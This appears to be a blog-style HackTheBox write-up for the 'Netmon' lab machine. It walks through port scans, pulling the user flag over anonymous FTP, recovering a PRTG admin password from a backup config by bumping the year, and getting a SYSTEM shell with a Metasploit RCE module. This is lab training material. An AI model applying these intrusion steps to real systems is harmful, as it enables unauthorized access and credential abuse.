
# Netmon - HackTheBox

I'm going through NetSec's Trophy Room for fun and this box showed me how important it is to think outside of the box. Or in this case, like a lazy admin!

# Enumeration

I started off by running Rustscan on the target, then adding the IP into my /etc/hosts file.

```bash
Open 10.10.10.152:21
Open 10.10.10.152:80
Open 10.10.10.152:135
Open 10.10.10.152:139
Open 10.10.10.152:445
Open 10.10.10.152:5985
Open 10.10.10.152:47001
Open 10.10.10.152:49664
Open 10.10.10.152:49665
Open 10.10.10.152:49666
Open 10.10.10.152:49667
Open 10.10.10.152:49668
Open 10.10.10.152:49669
```

Next, an Nmap Scan.

```bash
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_02-25-19  11:49PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-favicon: Unknown favicon MD5: 36B3EF286FA4BEFBB797A0966B456479
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: PRTG/18.1.37.13946
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-09-01T18:53:12
|_  start_date: 2022-09-01T18:48:00
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

# User Flag

FTP had anonymous access allowed. So logging in as an anonymous user and browsing to the Public user rewards you with the user flag.

```bash
 manwithaplan@manwithabox  /media/sf_manwithaplan/HTB/netmon  ftp netmon.htb
Connected to netmon.htb.
220 Microsoft FTP Service
Name (netmon.htb:manwithaplan): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
02-25-19  11:49PM       <DIR>          Windows
226 Transfer complete.
ftp> cd Use
550 The system cannot find the file specified. 
ftp> cd Users
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-25-19  11:44PM       <DIR>          Administrator
02-03-19  12:35AM       <DIR>          Public
226 Transfer complete.
ftp> cd Public
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  08:05AM       <DIR>          Documents
07-16-16  09:18AM       <DIR>          Downloads
07-16-16  09:18AM       <DIR>          Music
07-16-16  09:18AM       <DIR>          Pictures
09-01-22  02:48PM                   34 user.txt
07-16-16  09:18AM       <DIR>          Videos
226 Transfer complete.
ftp> get user.txt
local: user.txt remote: user.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
34 bytes received in 0.06 secs (0.5649 kB/s)
ftp> exit
221 Goodbye.
 manwithaplan@manwithabox  /media/sf_manwithaplan/HTB/netmon  cat user.txt 
[REDACTED]
 manwithaplan@manwithabox  /media/sf_manwithaplan/HTB/netmon  
```

# Root Flag

## Getting admin creds

There is a website running on port 80.

![PRTG Network Monitor](https://i.gyazo.com/0dc803cbd9f2852ecd223bc55083cc60.png)

Default creds (prtgadmin:prtgadmin) didnt work but [this](https://www.reddit.com/r/sysadmin/comments/835dai/prtg_exposes_domain_accounts_and_passwords_in/) reddit post led me to this directory:

```bash
/ProgramData/Paessler/PRTG Network Monitor
```

In that folder, credentials can be found in PRTG Confguration.old.bak

```xml
<!-- User: prtgadmin -->
    PrTg@dmin2018
```

However these creds didnt work.

Embarrasingly I needed to use the official guide, and instead of PrTg@dmin2018, PrTg@dmin**2019** was the correct password.

Always check for those kinds of patterns as lazy admins passwords change with months/years.

## Popping a revshell (Easy Way)

Conviniently, there is a metasploit module for RCE

```bash
exploit/windows/http/prtg_authenticated_rce
```

The account running PRTG was already authenticated as SYSTEM so the flag was trivial.

```powershell
meterpreter > cd Administrator
meterpreter > ls
Listing: C:\Users\Administrator
===============================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2019-02-03 06:08:34 -0600  AppData
040777/rwxrwxrwx  0       dir   2019-02-03 06:08:34 -0600  Application Data
040555/r-xr-xr-x  0       dir   2019-02-03 06:08:38 -0600  Contacts
040777/rwxrwxrwx  0       dir   2019-02-03 06:08:34 -0600  Cookies
040555/r-xr-xr-x  0       dir   2019-02-02 22:35:23 -0600  Desktop
040555/r-xr-xr-x  4096    dir   2019-02-03 06:08:39 -0600  Documents
040555/r-xr-xr-x  0       dir   2019-02-03 06:08:39 -0600  Downloads
040555/r-xr-xr-x  0       dir   2019-02-03 06:08:38 -0600  Favorites
040555/r-xr-xr-x  0       dir   2019-02-03 06:08:39 -0600  Links
040777/rwxrwxrwx  0       dir   2019-02-03 06:08:34 -0600  Local Settings
040555/r-xr-xr-x  0       dir   2019-02-03 06:08:39 -0600  Music
040777/rwxrwxrwx  0       dir   2019-02-03 06:08:34 -0600  My Documents
100666/rw-rw-rw-  262144  fil   2022-09-01 14:13:18 -0500  NTUSER.DAT
100666/rw-rw-rw-  65536   fil   2019-02-03 06:08:35 -0600  NTUSER.DAT{4c7e0ce3-af90-11e6-b29b-95ada9568386}.TM.blf
100666/rw-rw-rw-  524288  fil   2019-02-03 06:08:35 -0600  NTUSER.DAT{4c7e0ce3-af90-11e6-b29b-95ada9568386}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288  fil   2019-02-03 06:08:35 -0600  NTUSER.DAT{4c7e0ce3-af90-11e6-b29b-95ada9568386}.TMContainer00000000000000000002.regtrans-ms
040777/rwxrwxrwx  0       dir   2019-02-03 06:08:34 -0600  NetHood
040555/r-xr-xr-x  0       dir   2019-02-03 06:08:38 -0600  Pictures
040777/rwxrwxrwx  0       dir   2019-02-03 06:08:34 -0600  PrintHood
040777/rwxrwxrwx  0       dir   2019-02-03 06:08:34 -0600  Recent
040555/r-xr-xr-x  0       dir   2019-02-03 06:08:39 -0600  Saved Games
040555/r-xr-xr-x  0       dir   2019-02-03 06:08:39 -0600  Searches
040777/rwxrwxrwx  0       dir   2019-02-03 06:08:34 -0600  SendTo
040777/rwxrwxrwx  0       dir   2019-02-03 06:08:34 -0600  Start Menu
040777/rwxrwxrwx  0       dir   2019-02-03 06:08:34 -0600  Templates
040555/r-xr-xr-x  0       dir   2019-02-25 21:06:13 -0600  Videos
100666/rw-rw-rw-  98304   fil   2019-02-03 06:08:34 -0600  ntuser.dat.LOG1
100666/rw-rw-rw-  114688  fil   2019-02-03 06:08:34 -0600  ntuser.dat.LOG2
100666/rw-rw-rw-  20      fil   2019-02-03 06:08:34 -0600  ntuser.ini

meterpreter > cd Desktop
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2019-02-03 06:08:39 -0600  desktop.ini
100444/r--r--r--  34    fil   2022-09-01 13:48:44 -0500  root.txt

meterpreter > cat root.txt
[REDACTED]
```
